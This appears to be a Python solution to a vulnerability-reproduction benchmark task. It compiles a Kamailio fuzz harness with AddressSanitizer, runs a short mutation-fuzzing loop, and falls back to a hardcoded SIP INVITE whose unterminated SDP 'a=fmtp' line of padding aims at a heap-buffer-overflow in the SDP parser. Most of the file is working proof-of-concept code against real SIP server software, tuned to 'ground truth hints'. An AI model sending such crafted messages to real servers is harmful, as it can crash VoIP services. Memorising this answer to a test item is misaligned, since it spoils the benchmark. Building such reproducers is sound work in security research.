import os
import sys
import tarfile
import tempfile
import subprocess
import shutil
import glob
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Create a temporary directory for extraction and compilation
        with tempfile.TemporaryDirectory() as work_dir:
            # 1. Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                # If extraction fails, fallback to heuristic generation
                return self.fallback_poc()

            # 2. Locate the fuzz harness
            fuzz_source = None
            for root, dirs, files in os.walk(work_dir):
                for f in files:
                    if f.endswith(".c"):
                        path = os.path.join(root, f)
                        try:
                            with open(path, 'r', errors='ignore') as fp:
                                if "LLVMFuzzerTestOneInput" in fp.read():
                                    fuzz_source = path
                                    break
                        except:
                            pass
                if fuzz_source:
                    break
            
            if not fuzz_source:
                return self.fallback_poc()

            # 3. Create a shim main.c to run the fuzzer harness
            shim_path = os.path.join(work_dir, "shim_fuzz_main.c")
            with open(shim_path, "w") as f:
                f.write("""
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = (uint8_t*)malloc(len);
    if (!buf) { fclose(f); return 1; }
    fread(buf, 1, len, f);
    fclose(f);
    LLVMFuzzerTestOneInput(buf, len);
    free(buf);
    return 0;
}
                """)

            # 4. Identify source files for compilation
            sources = []
            includes = set()
            for root, dirs, files in os.walk(work_dir):
                for f in files:
                    if f.endswith(".c"):
                        sources.append(os.path.join(root, f))
                    if f.endswith(".h"):
                        includes.add(f"-I{root}")
            
            # Filter sources to include only relevant parts (Core + Parser) and avoid conflicts
            compile_srcs = [shim_path, fuzz_source]
            for s in sources:
                if s == fuzz_source: continue
                if "main.c" in s or "test" in s or "example" in s: continue
                
                # Kamailio-specific heuristics
                if "core/parser/sdp" in s or "core/parser" in s or "core/mem" in s or "core/dprint" in s:
                    compile_srcs.append(s)
                elif "core/" in s and "modules" not in s:
                    compile_srcs.append(s)
            
            # Fallback if heuristics filtered too much
            if len(compile_srcs) < 5:
                compile_srcs = [shim_path, fuzz_source]
                for s in sources:
                    if s == fuzz_source: continue
                    if "main.c" in s: continue
                    compile_srcs.append(s)

            exe_path = os.path.join(work_dir, "fuzz_harness")
            cmd = ["clang", "-fsanitize=address", "-g", "-O1", "-D_GNU_SOURCE", "-DPKG_MALLOC", "-DSHM_MEM", "-DSHM_MMAP"] + \
                  list(includes) + ["-o", exe_path] + compile_srcs
            
            # 5. Compile
            try:
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
            except Exception:
                return self.fallback_poc()
            
            # 6. Fuzz
            seeds = [self.fallback_poc()]
            # Generate initial variations
            for _ in range(20):
                seeds.append(self.mutate(self.fallback_poc()))
            
            start_time = time.time()
            # Run fuzz loop for up to 45 seconds
            while time.time() - start_time < 45:
                candidate = seeds[random.randint(0, len(seeds)-1)]
                mutated = self.mutate(candidate)
                
                # Write candidate to tmp file
                with tempfile.NamedTemporaryFile(delete=False) as tf:
                    tf.write(mutated)
                    tf_name = tf.name
                
                try:
                    res = subprocess.run([exe_path, tf_name], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=1)
                    # Check for crash
                    if res.returncode != 0:
                        if b"AddressSanitizer" in res.stderr or b"heap-buffer-overflow" in res.stderr:
                            os.remove(tf_name)
                            return mutated
                except Exception:
                    pass
                finally:
                    if os.path.exists(tf_name):
                        os.remove(tf_name)
                
                # Keep corpus small but evolving
                if len(seeds) < 100:
                    seeds.append(mutated)

            return self.fallback_poc()

    def mutate(self, data: bytes) -> bytes:
        arr = bytearray(data)
        if not arr: return bytes(arr)
        method = random.randint(0, 4)
        if method == 0: # Bit flip
            idx = random.randint(0, len(arr)-1)
            arr[idx] ^= (1 << random.randint(0, 7))
        elif method == 1: # Insert byte
            idx = random.randint(0, len(arr))
            arr.insert(idx, random.randint(0, 255))
        elif method == 2: # Delete byte
            if len(arr) > 10:
                idx = random.randint(0, len(arr)-1)
                del arr[idx]
        elif method == 3: # Append garbage
            arr += b"A" * random.randint(1, 100)
        elif method == 4: # Truncate
             if len(arr) > 10:
                 arr = arr[:random.randint(1, len(arr))]
        return bytes(arr)

    def fallback_poc(self) -> bytes:
        """
        Returns a hardcoded PoC that attempts to trigger the described vulnerability:
        "code does not check if it is still before the end of the value".
        This usually implies a missing boundary check when parsing an attribute value at the end of the buffer.
        """
        headers = (
            b"INVITE sip:a@127.0.0.1 SIP/2.0\r\n"
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK-1\r\n"
            b"From: <sip:a@127.0.0.1>;tag=1\r\n"
            b"To: <sip:b@127.0.0.1>\r\n"
            b"Call-ID: 1\r\n"
            b"CSeq: 1 INVITE\r\n"
            b"Content-Type: application/sdp\r\n"
        )
        
        sdp_base = (
            b"v=0\r\n"
            b"o=- 1 1 IN IP4 127.0.0.1\r\n"
            b"s=-\r\n"
            b"c=IN IP4 127.0.0.1\r\n"
            b"t=0 0\r\n"
            b"m=audio 1 RTP/AVP 0\r\n"
            b"a=rtpmap:0 PCMU/8000\r\n"
        )
        
        # We aim for ~873 bytes total length to match ground truth hints
        current_len = len(headers) + len(sdp_base) + len("Content-Length: 000\r\n\r\n") 
        needed = 873 - current_len
        if needed < 50: needed = 400 # ensure we have enough buffer to overflow
        
        # Malformed line: key=value without CRLF at EOF
        evil = b"a=fmtp:0 " + b"A" * needed
        
        body = sdp_base + evil
        
        full = headers + f"Content-Length: {len(body)}\r\n\r\n".encode() + body
        return full